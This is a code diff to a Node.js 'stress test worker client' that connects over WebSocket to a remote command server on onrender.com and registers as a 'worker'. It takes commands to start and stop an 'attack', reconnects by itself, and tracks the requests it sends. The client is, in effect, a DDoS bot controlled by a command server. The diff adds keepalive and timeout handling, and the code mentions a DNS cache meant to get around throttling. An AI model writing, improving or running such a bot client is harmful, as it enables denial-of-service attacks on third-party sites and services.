@@ -3,7 +3,9 @@ const https = require('https');
 const http = require('http');
 const dns = require('dns').promises;
 
-const SERVER_URL = 'wss://new2-9ho5.onrender.com'; // Change this to your server address
+// IMPORTANT: Use wss:// for secure WebSocket (Render uses HTTPS)
+// Change this to your Render URL
+const SERVER_URL = 'wss://new2-9ho5.onrender.com'; // ⚠️ wss:// not https://
 
 // DNS Cache to bypass DNS throttling
 const dnsCache = new Map();
@@ -37,14 +39,36 @@ let isRunning = false;
 let stats = { sent: 0, success: 0, failed: 0 };
 let currentConfig = null;
 let attackStartTime = null;
+let keepAliveInterval = null;
 
 function connect() {
   console.log('[*] Connecting to command server...');
   ws = new WebSocket(SERVER_URL);
   
+  // Add timeout for connection
+  const connectionTimeout = setTimeout(() => {
+    if (ws.readyState !== WebSocket.OPEN) {
+      log('⚠ Connection timeout, retrying...');
+      ws.terminate();
+    }
+  }, 10000);
+  
   ws.on('open', () => {
+    clearTimeout(connectionTimeout);
     log('✓ Connected to command server');
     ws.send(JSON.stringify({ type: 'identify', role: 'worker' }));
+    
+    // Send keepalive every 25 seconds
+    if (keepAliveInterval) clearInterval(keepAliveInterval);
+    keepAliveInterval = setInterval(() => {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        try {
+          ws.ping();
+        } catch (e) {
+          console.error('[!] Keepalive ping failed');
+        }
+      }
+    }, 25000);
   });
 
   ws.on('message', async (data) => {
@@ -65,15 +89,22 @@ function connect() {
       stopAttack();
     }
   });
+  
+  ws.on('ping', () => {
+    ws.pong();
+  });
 
-  ws.on('close', () => {
-    log('✗ Disconnected from server');
+  ws.on('close', (code, reason) => {
+    clearTimeout(connectionTimeout);
+    if (keepAliveInterval) clearInterval(keepAliveInterval);
+    log(`✗ Disconnected from server (code: ${code})`);
     stopAttack();
     setTimeout(connect, 2000);
   });
 
   ws.on('error', (err) => {
-    console.error('WebSocket error:', err.message);
+    clearTimeout(connectionTimeout);
+    console.error('[!] WebSocket error:', err.message);
   });
 }
 
@@ -345,7 +376,10 @@ console.log(`
 ║     STRESS TEST WORKER CLIENT          ║
 ║         Node.js Edition                ║
 ╠════════════════════════════════════════╣
-║  Connecting to: ${SERVER_URL.padEnd(23)}║
+║  Server: ${SERVER_URL.substring(0, 36).padEnd(36)}║
+╠════════════════════════════════════════╣
+║  💡 For Render/HTTPS use wss://       ║
+║  💡 For localhost use ws://           ║
 ╚════════════════════════════════════════╝
 `);
 
@@ -358,6 +392,4 @@ process.on('SIGINT', () => {
   stopAttack();
   if (ws) ws.close();
   process.exit(0);
-
 });
-
